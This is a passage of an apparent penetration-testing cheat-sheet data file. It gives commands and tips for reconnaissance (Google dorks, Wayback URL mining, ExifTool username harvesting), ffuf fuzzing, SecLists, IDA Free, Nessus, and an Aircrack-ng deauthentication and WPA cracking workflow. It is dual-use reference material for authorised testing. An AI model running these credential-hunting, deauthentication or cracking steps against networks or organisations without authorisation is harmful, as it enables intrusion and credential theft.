            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Structured first pass on a domain", cmd: "site:example.com                                   # scale of the footprint\nsite:*.example.com -site:www.example.com           # subdomains\nsite:example.com filetype:pdf OR filetype:docx     # documents\nsite:example.com inurl:admin OR inurl:login        # panels\nsite:example.com intitle:\"index of\"                # open directories" },
              { label: "Hunt credentials in public code", cmd: "site:github.com \"example.com\" password\nsite:github.com \"example.com\" api_key\n# then repeat on GitHub code search with org: and path: filters" },
              { label: "Automate carefully", cmd: "# googlesearch-python or a paid SERP API — scraping Google directly\n# gets you captcha'd fast and violates their terms\npip install googlesearch-python" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Searching is passive; opening what you find is not. A dork that reveals an exposed admin panel does not authorise you to log into it.",
              "Automated dorking trips Google's bot detection quickly. Space queries out or use a proper SERP API.",
              "The Google Hacking Database at Exploit-DB is the canonical catalogue of proven queries — start there rather than inventing dorks from scratch.",
              "Findings can be stale. Check the cached date and confirm the resource is still live before reporting it.",
              "Try the same query on Bing and Yandex. Index coverage differs enough that each regularly finds what the others missed."
            ]
          }
        ]
      },
      {
        id: "wayback-machine",
        name: "Wayback Machine",
        url: "https://web.archive.org/",
        description: "Historical web archive — recovers removed pages, old endpoints, and deleted content.",
        brief: "The Internet Archive's Wayback Machine has been snapshotting the web since 1996. For reconnaissance that means every page, script, and parameter a site ever exposed is potentially still readable, including the ones deliberately removed.\n\nThe highest-value use is endpoint discovery: the archive's URL index returns every path it ever crawled for a domain, which routinely surfaces old API endpoints, admin paths, and parameters that are still live but no longer linked anywhere.",
        quickReference: [
          { label: "Every archived URL for a domain", cmd: "curl -s 'http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey'" },
          { label: "Same thing, one tool", cmd: "waybackurls example.com" },
          { label: "Browse snapshots", cmd: "web.archive.org/web/*/example.com" },
          { label: "Snapshot nearest a date", cmd: "web.archive.org/web/20200101/https://example.com" },
          { label: "Archived robots.txt (a path goldmine)", cmd: "web.archive.org/web/*/example.com/robots.txt" }
        ],
        sections: [
          {
            title: "CDX API Parameters",
            type: "table",
            columns: ["Parameter", "Description"],
            rows: [
              ["url=", "Target URL; supports * wildcards for domain-wide queries"],
              ["output=json|text", "Response format"],
              ["fl=", "Fields to return: original, timestamp, statuscode, mimetype, digest"],
              ["collapse=urlkey", "Deduplicate repeated URLs — almost always what you want"],
              ["from= / to=", "Date range as YYYYMMDD"],
              ["filter=statuscode:200", "Only successfully archived responses"],
              ["filter=mimetype:application/json", "Restrict by content type"],
              ["limit=", "Cap the number of results (negative values return the most recent)"],
              ["matchType=domain|prefix|host", "How broadly to interpret the url parameter"]
            ]
          },
          {
            title: "Companion Tools",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["waybackurls", "Fetches every archived URL for a domain in one command"],
              ["gau (getallurls)", "Same idea, but also queries Common Crawl, URLScan, and OTX"],
              ["waymore", "More thorough — retrieves the archived response bodies, not just URLs"],
              ["gauplus / hakrawler", "Combine archive URLs with live crawling"],
              ["unfurl", "Splits collected URLs into paths, parameters, and domains for analysis"],
              ["httpx", "Checks which of the historical URLs still resolve today"]
            ]
          },
          {
            title: "What to Look For",
            type: "table",
            columns: ["Target", "Why it matters"],
            rows: [
              ["Old API endpoints", "Frequently still live and unpatched after being removed from the UI"],
              ["Query parameters", "Historical parameters reveal input surface for testing on the current app"],
              ["JavaScript files", "Archived JS often contains endpoints, keys, and comments since stripped"],
              ["Removed pages", "Staff directories, org charts, and press releases taken down for a reason"],
              ["Old robots.txt", "Historic Disallow entries name paths the organisation wanted hidden"],
              ["Technology changes", "Compare snapshots to date a platform migration or a rebrand"],
              ["Deleted email addresses", "Contact pages archived before an address was removed"]
            ]
          },
          {
            title: "Related Archives",
            type: "table",
            columns: ["Source", "Notes"],
            rows: [
              ["Common Crawl", "Bulk web crawl data, queryable via its own index API"],
              ["archive.today", "Independent archive; captures pages the Wayback Machine misses or excludes"],
              ["URLScan.io", "Scans submitted by users, with full request/response detail"],
              ["Google cache", "Only the most recent copy, and increasingly deprecated"],
              ["Timetravel / Memento", "Aggregator that queries many archives at once"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Extract and triage historical endpoints", cmd: "waybackurls example.com | sort -u > wayback_urls.txt\nwc -l wayback_urls.txt\n# find parameterised endpoints:\ngrep '?' wayback_urls.txt | unfurl keys | sort | uniq -c | sort -rn" },
              { label: "Check which old URLs are still live", cmd: "cat wayback_urls.txt | httpx -silent -status-code -mc 200,301,302,401,403 \\\n  | tee still_live.txt" },
              { label: "Mine archived JavaScript", cmd: "waybackurls example.com | grep '\\.js$' | sort -u > js_urls.txt\n# fetch the archived copies and grep for endpoints and secrets\nwhile read u; do curl -s \"https://web.archive.org/web/2020/$u\"; done < js_urls.txt \\\n  | grep -oE '\"/[a-zA-Z0-9_/-]+\"' | sort -u" },
              { label: "Read historical robots.txt", cmd: "curl -s 'http://web.archive.org/cdx/search/cdx?url=example.com/robots.txt&output=text&fl=timestamp&collapse=digest'\n# fetch each distinct version and diff the Disallow entries" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Fetching from the archive is passive — you are querying archive.org, not the target. Testing what you find against the live site is not.",
              "A URL existing in the archive says nothing about whether it works today. Always verify with httpx before treating it as a finding.",
              "Archived JavaScript is consistently the richest source here; developers strip secrets from current builds and forget the old ones are preserved.",
              "The CDX API is rate-limited. For large domains use waybackurls or gau, which handle paging and backoff for you.",
              "gau covers more archives than waybackurls alone. On a thorough engagement, run both and merge."
            ]
          }
        ]
      },
      {
        id: "exiftool",
        name: "ExifTool",
        url: "https://exiftool.org/",
        description: "Reads and strips metadata from images, documents, and media files.",
        brief: "ExifTool reads, writes, and removes metadata across essentially every file format that carries it. In OSINT the read direction matters most: photographs carry GPS coordinates, camera serial numbers, and timestamps, while Office documents and PDFs carry author names, internal usernames, software versions, and sometimes internal file paths.\n\nA batch of documents downloaded from a target's website will frequently name their staff, their internal AD usernames, and the software they run — before you have touched a single system.",
        quickReference: [
          { label: "All metadata from a file", cmd: "exiftool image.jpg" },
          { label: "GPS coordinates only", cmd: "exiftool -gps:all -c \"%.6f degrees\" image.jpg" },
          { label: "Author fields across a folder", cmd: "exiftool -r -Author -Creator -LastModifiedBy ./docs/" },
          { label: "Strip all metadata", cmd: "exiftool -all= -overwrite_original file.jpg" },
          { label: "Tabular output across many files", cmd: "exiftool -T -filename -author -createdate -r ./docs/" }
        ],
        sections: [
          {
            title: "Reading Metadata",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["exiftool <file>", "Print every readable tag"],
              ["exiftool -r <dir>", "Recurse through a directory"],
              ["exiftool -<TAG> <file>", "Print one specific tag"],
              ["exiftool -a -u -g1 <file>", "Show duplicate and unknown tags, grouped by family"],
              ["exiftool -T -filename -tag1 -tag2 <files>", "Tab-delimited output, ideal for piping into a spreadsheet"],
              ["exiftool -json <file>", "Structured JSON output"],
              ["exiftool -csv -r <dir> > meta.csv", "CSV across a whole tree — the standard bulk-analysis move"],
              ["exiftool -ee <file>", "Extract embedded data from within the file"]
            ]
          },
          {
            title: "High-Value Tags",
            type: "table",
            columns: ["Tag", "What it reveals"],
            rows: [
              ["GPSLatitude / GPSLongitude", "Exact capture location — home, office, or travel pattern"],
              ["Author / Creator / LastModifiedBy", "Real names and often internal usernames"],
              ["Company / Manager", "Organisational detail embedded by Office"],
              ["Software / Producer / Creator Tool", "Exact application and version, i.e. a patch-level fingerprint"],
              ["CreateDate / ModifyDate", "Timeline reconstruction; timezone offsets hint at location"],
              ["Make / Model / SerialNumber", "Camera identity — a serial number links photos across accounts"],
              ["Title / Subject / Keywords", "Internal classification and project names"],
              ["Comment / XPComment", "Free text authors forget is stored"]
            ]
          },
          {
            title: "Document Metadata",
            type: "table",
            columns: ["Format", "What is typically embedded"],
            rows: [
              ["DOCX / XLSX / PPTX", "Author, last modified by, company, total edit time, revision count, template path"],
              ["PDF", "Producer and creator applications, author, sometimes the source document's full path"],
              ["Legacy DOC / XLS", "Richer still — often includes prior authors and printer names"],
              ["Images in documents", "Embedded photos keep their own EXIF, including GPS"],
              ["Tracked changes / comments", "Not ExifTool's job — check the raw XML, but the metadata points you there"],
              ["Internal paths", "\\\\fileserver\\dept\\ paths in template fields name internal hosts and share names"]
            ]
          },
          {
            title: "Writing & Stripping",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["exiftool -all= <file>", "Remove all metadata (writes a _original backup)"],
              ["exiftool -all= -overwrite_original <file>", "Strip without keeping a backup copy"],
              ["exiftool -gps:all= <file>", "Remove only location data"],
              ["exiftool -<TAG>=\"value\" <file>", "Set a specific tag"],
              ["exiftool -tagsfromfile src.jpg dst.jpg", "Copy metadata between files"],
              ["exiftool -r -all= -ext jpg <dir>", "Bulk-strip one file type across a tree"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Harvest usernames from published documents", cmd: "# collect the documents first\ngoogle: site:example.com filetype:pdf OR filetype:docx\nwget -i doc_urls.txt -P ./docs\n\nexiftool -r -T -filename -Author -Creator -LastModifiedBy -Company ./docs/ \\\n  | tee doc_metadata.tsv\n# unique author values are candidate usernames for AD or email enumeration" },
              { label: "Extract geolocation from an image set", cmd: "exiftool -r -filename -gpslatitude -gpslongitude -createdate \\\n  -c \"%.6f\" -T ./images/ | grep -v '^-'\n# plot the coordinates to see a movement pattern" },
              { label: "Fingerprint the software estate", cmd: "exiftool -r -T -filename -Software -Producer -CreatorTool ./docs/ \\\n  | sort -k2 | uniq -c -f1\n# version strings map directly to patch levels" },
              { label: "Clean your own files before publishing", cmd: "exiftool -r -all= -overwrite_original ./report_assets/\nexiftool -r ./report_assets/ | grep -iE 'author|gps|software'   # verify" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Document metadata is the most reliable way to learn an organisation's internal username format without touching their systems.",
              "Most social platforms strip EXIF on upload, so photos from Instagram or Facebook rarely carry GPS. Files from a company website usually do.",
              "-csv across a directory turns a folder of PDFs into a sortable table of authors and software versions in one command.",
              "Metadata is trivially forged. Treat it as corroborating evidence, not proof.",
              "Run the strip commands on your own deliverables before sending them — reports leak their author's details exactly the same way."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Web Application",
    tools: [
      {
        id: "ffuf",
        name: "FFUF",
        url: "https://github.com/ffuf/ffuf",
        description: "Fast web fuzzer for directories, virtual hosts, and parameters.",
        brief: "ffuf (Fuzz Faster U Fool) is a fast, flexible, Go-based fuzzer — the go-to for directory/file discovery, virtual host discovery, and parameter fuzzing against a web target, all using the same FUZZ-keyword syntax.",
        quickReference: [
          { label: "Directory/file discovery", cmd: "ffuf -w wordlist.txt -u https://target.com/FUZZ" },
          { label: "Virtual host discovery", cmd: "ffuf -w subdomains.txt -u https://target.com -H \"Host: FUZZ.target.com\"" },
          { label: "Parameter fuzzing", cmd: "ffuf -w wordlist.txt -u \"https://target.com/?FUZZ=test\"" },
          { label: "Cut a repeated false-positive response", cmd: "ffuf -w wordlist.txt -u https://target.com/FUZZ -fs <size>" }
        ],
        sections: [
          {
            title: "Directory Discovery",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-u https://target.com/FUZZ", "Base directory/file discovery"],
              ["-e .php,.txt,.bak", "Append extensions to each wordlist entry"],
              ["-t 100", "Set thread count (default 40) — raise carefully, watch for rate limiting"],
              ["-recursion", "Automatically re-fuzz inside directories that return a hit (see Recursive Fuzzing)"]
            ]
          },
          {
            title: "Virtual Hosts",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-u https://target.com -H \"Host: FUZZ.target.com\"", "Fuzz the Host header to find virtual hosts sharing one IP"],
              ["Baseline comparison", "Check the response for an obviously-wrong hostname first — a wildcard/default vhost often returns the same response for everything, so real hits are the ones that differ"]
            ]
          },
          {
            title: "Parameters",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-u \"https://target.com/?FUZZ=test\"", "Fuzz GET parameter names"],
              ["-u \"https://target.com/?id=FUZZ\"", "Fuzz a known parameter's value"],
              ["-X POST -d \"user=FUZZ&pass=test\"", "Fuzz inside a POST body"]
            ]
          },
          {
            title: "Recursive Fuzzing",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-recursion", "Automatically fuzz inside any directory that returns a hit"],
              ["-recursion-depth <n>", "Cap how many levels deep recursion goes"],
              ["Caution", "Scan time grows fast with recursion on a large wordlist — start shallow"]
            ]
          },
          {
            title: "Filters",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-fc <codes>", "Filter OUT specific response status codes"],
              ["-fs <size>", "Filter OUT responses of a specific size (the classic \"kill the false-positive 404 page\" flag)"],
              ["-fw <count>", "Filter OUT responses with a specific word count"],
              ["-fl <count>", "Filter OUT responses with a specific line count"]
            ]
          },
          {
            title: "Matchers",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-mc <codes>", "Match ONLY specific status codes (default: 200-299,301,302,307,401,403,405)"],
              ["-ms <size>", "Match ONLY a specific response size"],
              ["-mr <regex>", "Match ONLY responses whose body matches a regex"]
            ]
          },
          {
            title: "Auto Calibration",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-ac", "Auto-detect and filter likely false-positive responses (wildcard/catch-all pages) instead of manually figuring out -fs/-fc"]
            ]
          },
          {
            title: "Wordlist Usage",
            type: "table",
            columns: ["Flag / Example", "Description"],
            rows: [
              ["-w wordlist.txt", "Single wordlist, keyword defaults to FUZZ"],
              ["-w list1.txt:FUZZ1 -w list2.txt:FUZZ2", "Multiple wordlists with distinct keywords, e.g. for combined vhost + path fuzzing"],
              ["SecLists cross-reference", "Discovery/Web-Content/ and Discovery/DNS/ from SecLists are the usual default wordlist source"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Initial directory sweep", cmd: "ffuf -w common.txt -u https://target.com/FUZZ\n# note the baseline 404 size, then:\nffuf -w common.txt -u https://target.com/FUZZ -fs <baseline_size>\n# once a stack is confirmed, re-run with matching extensions:\nffuf -w common.txt -u https://target.com/FUZZ -e .php,.bak" },
              { label: "Recursive enumeration", cmd: "ffuf -w common.txt -u https://target.com/FUZZ -recursion -recursion-depth 2" },
              { label: "Parameter discovery on a found endpoint", cmd: "ffuf -w params.txt -u \"https://target.com/page?FUZZ=test\"\n# once a real param is found:\nffuf -w values.txt -u \"https://target.com/page?found_param=FUZZ\"" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Add -p <seconds> to throttle requests if you start tripping a WAF or getting blocked mid-scan.",
              "Always check what a 'normal' 404/catch-all response looks like before trusting -mc or -fc results blindly.",
              "Save output with -o results.json -of json so you can diff results between runs later.",
              "-ac is a good default starting point on unfamiliar targets; drop to manual -fs/-fc once you understand the baseline."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Forensics / Reverse Engineering",
    tools: [
      {
        id: "ida-free",
        name: "IDA Free",
        url: "https://hex-rays.com/ida-free/",
        description: "Disassembler for static analysis of 32/64-bit binaries, free tier.",
        brief: "IDA is one of the most established disassemblers. The free tier covers static disassembly of 32/64-bit binaries — no debugger, no Hex-Rays pseudocode decompiler, but plenty for orienting yourself in an unfamiliar binary.",
        quickReference: [
          { label: "Load a binary", cmd: "File > Open  (let auto-analysis finish before doing anything else)" },
          { label: "Jump to strings", cmd: "Shift+F12  — fastest way to orient in an unfamiliar binary" },
          { label: "Cross-references to a selection", cmd: "X" },
          { label: "Toggle graph / linear view", cmd: "Space" }
        ],
        sections: [
          {
            title: "Interface Layout",
            type: "table",
            columns: ["Pane", "Description"],
            rows: [
              ["Functions window", "Every function IDA recognized — the main index into the binary"],
              ["Strings window", "Every printable string embedded in the binary — often the fastest orientation point"],
              ["Hex view", "Raw byte view alongside disassembly, synced to the current address"],
              ["Graph view", "Disassembly rendered as basic blocks connected by branches"],
              ["Output window", "IDA's own log — analysis progress, script output, errors"]
            ]
          },
          {
            title: "Functions",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["Functions window", "Lists every recognized function by name/address — double-click to jump to it"],
              ["N", "Rename the function or variable under the cursor — do this as you go, not at the end"],
              ["Likely entry points", "Look for main, WinMain, or DllMain first — everything else usually branches from there"]
            ]
          },
          {
            title: "Strings",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["Shift+F12", "Open the Strings window"],
              ["Filter box", "Search/filter the string list by substring"],
              ["Pivot via xref", "Double-click a suspicious string, then X to jump back into the code that references it"]
            ]
          },
          {
            title: "Cross References",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["X", "Show all references TO the selected function or variable"],
              ["Ctrl+X", "Alternate xref view (depending on IDA version/context)"],
              ["Reading the xref list", "Shows every caller of a function or every use of a variable — the fastest way to understand how something is actually used"]
            ]
          },
          {
            title: "Graph View",
            type: "table",
            columns: ["Action", "Description"],
            rows: [
              ["Basic blocks", "Each box is a straight-line block of instructions; arrows are branches"],
              ["Collapse / expand node", "Right-click a node to collapse it and reduce visual noise in a large function"],
              ["When to switch to linear view", "Tight loops or dense data blobs are usually easier to read as plain linear disassembly (Space toggles this)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Static analysis workflow", cmd: "1. Load the binary, let auto-analysis finish\n2. Check the Strings window for anything suspicious\n3. Pivot via xrefs (X) into the function that uses it\n4. Rename functions/variables as you understand them\n5. Note: free tier has no F5 pseudocode — read raw disassembly" },
              { label: "Reverse engineering workflow", cmd: "1. Identify the entry point (main/WinMain/DllMain)\n2. Trace major control flow in Graph view\n3. Flag calls to interesting APIs (network, file, registry)\n4. Cross-reference each flagged call to see where it's invoked from\n5. Document findings function-by-function as you go" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "The free tier has no debugger and no Hex-Rays decompiler — disassembly and static analysis only.",
              "Rename functions and variables as you go — future-you (or whoever you hand the analysis to) will thank you.",
              "If a task genuinely needs a decompiler or a debugger, Ghidra is a solid free fallback for that specific step."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Wordlists",
    tools: [
      {
        id: "seclists",
        name: "SecLists",
        url: "https://github.com/danielmiessler/SecLists",
        description: "The wordlist collection nearly every fuzzing tool ends up pointing at.",
        brief: "SecLists is the wordlist collection nearly every fuzzing and brute-force tool ends up pointing at — usernames, passwords, discovery paths, DNS, and fuzzing payload seeds, all grouped by purpose in one repo.",
        quickReference: [
          { label: "Clone the repo", cmd: "git clone https://github.com/danielmiessler/SecLists.git" },
          { label: "Default web discovery list", cmd: "SecLists/Discovery/Web-Content/common.txt" },
          { label: "Default password list", cmd: "SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt" },
          { label: "Default subdomain list", cmd: "SecLists/Discovery/DNS/subdomains-top1million-5000.txt" }
        ],
        sections: [
          {
            title: "Discovery Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Discovery/Web-Content/", "Directory and file brute-forcing wordlists"],
              ["Discovery/DNS/", "Subdomain brute-forcing wordlists"],
              ["Discovery/SNMP/", "Common SNMP community strings"]
            ]
          },
          {
            title: "Web Content Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["common.txt", "General-purpose default — good first pass"],
              ["quickhits.txt", "Small, low-noise, fast pass"],
              ["raft-small/-medium/-large-directories.txt", "Bigger lists, in order of size/time tradeoff"],
              ["raft-large-files.txt", "Common filenames rather than directories"]
            ]
          },
          {
            title: "DNS Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["subdomains-top1million-5000.txt", "Fast, good default subdomain list"],
              ["subdomains-top1million-20000.txt", "Bigger, slower, more coverage"],
              ["namelist.txt", "Broader general-purpose DNS wordlist"]
            ]
          },
          {
            title: "Usernames",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Usernames/Names/names.txt", "Common first/last names — good for generating username permutations"],
              ["Usernames/top-usernames-shortlist.txt", "Small, high-hit-rate default account names"],
              ["Usernames/cirt-default-usernames.txt", "Known vendor default usernames"]
            ]
          },
          {
            title: "Passwords",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Passwords/Leaked-Databases/rockyou.txt", "The classic — huge, real-world leaked password corpus"],
              ["Passwords/Common-Credentials/", "Smaller curated common-password lists"],
              ["Passwords/Default-Credentials/", "Known vendor default username:password pairs"]
            ]
          },
          {
            title: "Fuzzing Lists",
            type: "table",
            columns: ["Path", "Description"],
            rows: [
              ["Fuzzing/", "General-purpose fuzzing payload seeds for input-handling tests"],
              ["Fuzzing/big-list-of-naughty-strings.txt", "Edge-case strings (unicode, encoding, format issues) for input validation testing"]
            ]
          },
          {
            title: "Recommended Lists",
            type: "table",
            columns: ["If you only grab three", "Use it for"],
            rows: [
              ["Discovery/Web-Content/common.txt", "Directory/file brute-forcing"],
              ["Passwords/Leaked-Databases/rockyou.txt", "Password cracking/spraying"],
              ["Discovery/DNS/subdomains-top1million-5000.txt", "Subdomain enumeration"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Typical workflow", cmd: "git clone https://github.com/danielmiessler/SecLists.git\n# pick list size based on time budget — start small, escalate if nothing hits\nffuf -w SecLists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ\n# escalate:\nffuf -w SecLists/Discovery/Web-Content/raft-large-directories.txt -u https://target.com/FUZZ" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Bigger isn't always better — a huge wordlist against a slow endpoint can take hours; start small and escalate only if needed.",
              "Keep the repo updated (git pull) — lists get added and revised over time.",
              "Combine two lists with separate keywords (e.g. -w users.txt:USER -w passwords.txt:PASS) where the target tool supports it."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Wireless Security",
    tools: [
      {
        id: "aircrack-ng",
        name: "Aircrack-ng Suite",
        url: "https://www.aircrack-ng.org/",
        description: "WiFi auditing suite — capture, handshake collection, and WPA/WPA2 cracking.",
        brief: "Aircrack-ng is a suite of tools for auditing WiFi networks — monitor-mode capture, handshake collection, deauthentication, and offline WPA/WPA2 key cracking, all working off the same .cap capture files.",
        quickReference: [
          { label: "Enable monitor mode", cmd: "airmon-ng start wlan0" },
          { label: "Capture and scan for targets", cmd: "airodump-ng wlan0mon" },
          { label: "Deauth a client (forces a handshake)", cmd: "aireplay-ng --deauth 5 -a <bssid> wlan0mon" },
          { label: "Crack a captured handshake", cmd: "aircrack-ng -w wordlist.txt -b <bssid> capture.cap" }
        ],
        sections: [
          {
            title: "Monitor Mode",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["airmon-ng check kill", "Kill processes that tend to interfere with monitor mode (NetworkManager, wpa_supplicant)"],
              ["airmon-ng start wlan0", "Put the adapter into monitor mode (usually creates wlan0mon)"],
              ["airmon-ng stop wlan0mon", "Revert the adapter back to managed mode when done"]
            ]
          },
          {
            title: "Capture",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["airodump-ng wlan0mon", "General scan — lists nearby networks and connected clients"],
              ["airodump-ng -c <ch> --bssid <bssid> -w capture wlan0mon", "Targeted capture on one network/channel, written to a file"],
              ["Reading the output", "BSSID / PWR / CH / ENC / ESSID columns identify the network; the station table below shows connected clients"]
            ]
          },
          {
            title: "Handshake Collection",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["Targeted airodump-ng capture", "Leave a targeted capture running while waiting for a client to (re)connect"],
              ["WPA handshake indicator", "airodump-ng shows a handshake notice in the top-right once one is captured"],
              ["aircrack-ng capture.cap -b <bssid>", "Quick check on an existing capture file to confirm a handshake is actually present"]
            ]
          },
          {
            title: "WPA/WPA2 Cracking",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["aircrack-ng -w wordlist.txt -b <bssid> capture.cap", "Offline dictionary attack against a captured handshake"],
              ["hcxpcapngtool -o hash.hc22000 capture.cap", "Convert a capture for GPU-accelerated cracking with hashcat instead"],
              ["Feasibility caveat", "This only works against dictionary-guessable passphrases — a strong passphrase makes the whole approach impractical"]
            ]
          },
          {
            title: "Deauthentication",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["aireplay-ng --deauth 5 -a <bssid> wlan0mon", "Deauth every client on a network — forces reconnects, useful for capturing a handshake"],
              ["aireplay-ng --deauth 5 -a <bssid> -c <client_mac> wlan0mon", "Deauth one specific client instead of the whole network"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full handshake-and-crack workflow", cmd: "airmon-ng check kill\nairmon-ng start wlan0\nairodump-ng wlan0mon\n# note the target BSSID + channel, then:\nairodump-ng -c <ch> --bssid <bssid> -w capture wlan0mon\n# in a second terminal, force a reconnect:\naireplay-ng --deauth 5 -a <bssid> wlan0mon\n# once the handshake is confirmed captured:\naircrack-ng -w wordlist.txt -b <bssid> capture.cap" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Only test networks you own or have explicit written authorization to test — deauthing or cracking a network without authorization is illegal in most jurisdictions.",
              "Requires a wireless adapter whose chipset supports both monitor mode and packet injection — not all of them do.",
              "This cracking approach targets WPA/WPA2-PSK specifically — WPA3's SAE handshake isn't vulnerable to the same offline dictionary attack.",
              "Cracking feasibility depends entirely on the passphrase being weak or dictionary-guessable — a strong passphrase makes this impractical regardless of wordlist size."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Vulnerability Scanning",
    tools: [
      {
        id: "nessus",
        name: "Nessus",
        url: "https://www.tenable.com/products/nessus",
        description: "Vulnerability scanner for CVEs, misconfigurations, and missing patches.",
        brief: "Nessus is a vulnerability scanner used to identify known CVEs, misconfigurations, and missing patches across a network. Credentialed scans (with valid local auth) return dramatically more accurate results than remote-only checks — get creds into scope whenever the engagement allows it.",
        quickReference: [
          { label: "Default general-purpose scan", cmd: "Scan Templates > Basic Network Scan" },
          { label: "Best results, whenever you have creds", cmd: "Add credentials under the scan's Credentials tab (Credentialed Scan)" },
          { label: "Benchmark-based audits (CIS, STIG, etc.)", cmd: "Scan Templates > Compliance Scan" },
          { label: "Triage results fast", cmd: "Review by Plugin Family first, before drilling into individual hosts" }
        ],
        sections: [
          {
            title: "Scan Templates",
            type: "table",
            columns: ["Template", "Description"],
            rows: [
              ["Basic Network Scan", "General-purpose default — host discovery, common services, default plugin set"],
              ["Advanced Scan", "Full manual control over every scan setting and plugin family"],
              ["Credentialed Patch Audit", "Authenticated, patch-focused scan against local vulnerabilities"],
              ["Compliance Scan", "Benchmark/policy-based (CIS, DISA STIG, PCI-DSS, etc.)"],
              ["Web Application Tests", "Basic web-focused checks — not a substitute for manual/Burp-style testing"]
            ]
          },
          {
            title: "Basic Network Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Coverage", "Host discovery plus common port/service checks against the default plugin set"],
              ["Typical use", "A fast first pass across an unfamiliar network before deciding where to go deeper"]
            ]
          },
          {
            title: "Advanced Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Plugin family selection", "Full manual control over which plugin families are in/out of scope"],
              ["Custom port ranges", "Scope the scan to exactly the ports relevant to the engagement"],
              ["Timing/performance tuning", "Adjust scan aggressiveness for fragile or bandwidth-constrained networks"]
            ]
          },
          {
            title: "Credentialed Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Credentials supplied", "SSH, SMB/Windows, database, or other local auth, set under the scan's Credentials tab"],
              ["Why it matters", "Local checks (installed packages, patch level) are far more accurate than remote version-guessing"],
              ["Setup", "Store credentials once in Tenable's credential manager, reuse across scan policies"]
            ]
          },
          {
            title: "Compliance Scan",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Benchmark selection", "Choose a standard like CIS Level 1/2 or DISA STIG at scan setup"],
              ["Reporting style", "Pass/fail per control, not a CVE list — built for audits rather than pentests"]
            ]
          },
          {
            title: "Plugin Families",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["What a family groups", "Related plugins under one label, e.g. \"Windows\", \"Web Servers\", \"Default Unix Accounts\""],
              ["Scoping a scan", "Enable/disable whole families to focus a scan or cut noise/runtime"],
              ["Why triage by family first", "Skimming by family surfaces patterns (e.g. \"every host missing the same patch\") far faster than reading findings host-by-host"]
            ]
          },
          {
            title: "Policies",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Policy vs. scan", "A policy is a reusable saved configuration; a scan is a specific run using one"],
              ["Common practice", "Maintain a standing \"default internal\" and \"default external\" policy rather than reconfiguring every time"]
            ]
          },
          {
            title: "Reports",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Export formats", "HTML, PDF, CSV, or Nessus's native format"],
              ["Severity breakdown", "Critical / High / Medium / Low / Info"],
              ["Filtering", "Filter the report view by plugin family or by host before exporting"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Running a credentialed internal scan", cmd: "1. New Scan > Basic Network Scan\n2. Credentials tab > add SSH/SMB creds\n3. Set scope to the internal range\n4. Launch\n5. Once complete, triage by Plugin Family first" },
              { label: "Compliance audit workflow", cmd: "1. New Scan > Compliance Scan\n2. Select the benchmark (e.g. CIS Level 1)\n3. Add credentials\n4. Run against in-scope hosts\n5. Export the pass/fail report for the audit record" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Credentialed scans return far more accurate results than remote-only checks — prioritize getting valid creds into scope wherever the engagement allows it.",
              "Keep the plugin feed updated; a stale feed misses recently disclosed vulnerabilities entirely.",
              "Spot-check a handful of findings manually before including them in a report — automated scanners do produce false positives.",
              "Heavy/aggressive scans can impact fragile or legacy systems — plan scan windows and throttling on production networks."
            ]
          }
